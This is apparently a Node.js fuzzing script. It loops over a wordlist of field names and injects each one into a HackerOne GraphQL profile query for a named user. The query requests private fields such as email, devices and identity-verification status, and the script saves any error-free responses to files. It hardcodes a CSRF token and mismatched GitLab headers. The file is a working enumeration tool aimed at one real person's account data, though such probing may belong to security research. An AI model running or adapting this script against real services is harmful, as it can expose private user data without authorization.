const axios = require("axios");
const fs = require("fs");

const { filesName } = require("./burbsuit-Hone.js");

const TIME_FOR_REQ = 1000;
const resultsError = [];
const resultsSuccess = [];
let i = 0;
// const filesName = mood.slice(0, 1);
//${el.toLowerCase()}
console.log(filesName.length);
const headers = {
  Cookie: "Test",
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  Accept: "*/*",
  "Accept-Language": "en-GB,en;q=0.5",
  "Accept-Encoding": "gzip, deflate, br",
  Referer: "https://gitlab.com/poda.poda/back-end",
  "Content-Type": "application/json",
  "X-Csrf-Token":
    "ukkkLNQeLO0eBoAzXLVKlSPHb3-ROl8BxmO8MiDVY45OIbtU8kWo734N0aGnI-vsvnr764cPlq7mCK0d8RdfqA",
  "X-Gitlab-Feature-Category": "groups_and_projects",
  Origin: "https://gitlab.com",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  Priority: "u=4",
  Te: "trailers",
};

const url = "https://hackerone.com/graphql";

filesName.forEach(async (el, index) => {
  const data = {
    query: `query UserProfilePage($resourceIdentifier: String!) {
  me {
    id
    username
  user_identity{
 __typename
   }
    ...UserProfileMe
    ...UserProfileCardMe
    ...UserStatsMe
    __typename
  }
  user(username: $resourceIdentifier) {
    id
    username
    ${el}
     email_alias
   user_identity{
 __typename
  id
  }
    email
        user_devices{
   __typename
    }
    user_availabilities{
   __typename
  }
    name
    _id
    name
    intro
    profileActivated: profile_activated
    pentester_profile {
      id
      ...PentestsPentesterProfile
      __typename
    }
    user_streak {
      id
      length
      start_date
      end_date
      __typename
    }
    ...UserProfileUser
    ...UserProfileCardUser
    ...CreditsUser
    ...BadgesUser
    ...ReviewUser
    ...UserStatsUser
    __typename
  }
  ...UserProfileCardIdV
}

fragment UserProfileMe on User {
  id
  username
  __typename
}

fragment UserProfileUser on User {
  id
  username
  __typename
}

fragment UserProfileCardUser on User {
  id
  created_at
  location
  website
  bio
  name
  username
  profile_picture(size: large)
  bugcrowd_handle
  hack_the_box_handle
  github_handle
  gitlab_handle
  linkedin_handle
  twitter_handle
  cleared
  verified
  open_for_employment
  ...FollowUser
  __typename
}

fragment FollowUser on User {
  id
  followed
  __typename
}

fragment UserProfileCardMe on User {
  id
  __typename
}

fragment UserProfileCardIdV on Query {
  id_verification {
    status
    __typename
  }
  __typename
}

fragment PentestsPentesterProfile on PentesterProfile {
  id
  completed_pentests_number
  __typename
}

fragment CreditsUser on User {
  id
  username
  resolved_report_count
  thanks_item_count: thanks_items {
    total_count
    __typename
  }
  __typename
}

fragment BadgesUser on User {
  id
  username
  badges(first: 3) {
    edges {
      awarded_at
      node {
        id
        name
        image_path
        __typename
      }
      __typename
    }
    __typename
  }
  __typename
}

fragment ReviewUser on User {
  id
  public_reviews(first: 5) {
    edges {
      node {
        id
        public_feedback
        team {
          id
          name
          handle
          __typename
        }
        __typename
      }
      __typename
    }
    __typename
  }
  __typename
}

fragment UserStatsUser on User {
  id
  username
  __typename
}

fragment UserStatsMe on User {
  id
  __typename
}
`,
    operationName: "UserProfilePage",
    variables: {
      resourceIdentifier: "abdelrahman_maged",
      product_area: "user-management",
      product_feature: "signin",
    },
  };

  // إرسال الطلب باستخدام axios
  setTimeout(function () {
    axios
      .post(url, data, { headers })
      .then((response) => {
        if (!JSON.stringify(response.data).includes("errors")) {
          resultsSuccess.push(
            `${response.status} , ${el} , RES:
${JSON.stringify(response.data)}`
          );
          console.log(`${response.status} , ${el}`);
        } else {
          i++;
          resultsError.push(
            `Error ${i}: ${response.status} , ${el}  , RES:
${JSON.stringify(response.data)}`
          );
          if (
            i === 10 ||
            i === 100 ||
            i === 1000 ||
            i === 2000 ||
            i === 3000 ||
            i === 4000 ||
            i === 8000 ||
            i === 4000 ||
            i === 5000 ||
            i === 6000 ||
            i === 7000 ||
            i === 10000
          ) {
            console.log(`Error ${i}: ${response.status} , ${el}  , RES:
${JSON.stringify(response.data)}`);
          }
        }
      })
      .catch((error) => {
        i++;
        resultsError.push(
          `Error ${i}: ${error.status} , ${el} , RES:
${JSON.stringify(error.data)}`
        );
        console.log(error.status, el);
      });
  }, index * TIME_FOR_REQ);
});

function writeToFile(fileName, data) {
  fs.writeFile(fileName, data, (err) => {
    if (err) {
      console.error(`Error writing to file ${fileName}:`, err);
    } else {
      console.log(`Successfully wrote to file ${fileName}`);
    }
  });
}
const lenght2 = filesName.length;
// const lenght2 = 1000;
setTimeout(function () {
  writeToFile("resultsSuccess.txt", resultsSuccess.join("\n"));
  writeToFile("resultsError.txt", resultsError.join("\n"));
  console.log("end Tool");
}, (lenght2 + 20) * TIME_FOR_REQ);
console.log(
  `Will take ${((lenght2 + 20) * TIME_FOR_REQ) / 1000} Secund
`,
  `Start in ${new Date().getHours()}:${new Date().getMinutes()}`,
  `End in ${new Date(
    Date.now() + (lenght2 + 20) * TIME_FOR_REQ
  ).getHours()}:${new Date(
    Date.now() + (lenght2 + 20) * TIME_FOR_REQ
  ).getMinutes()}`
);
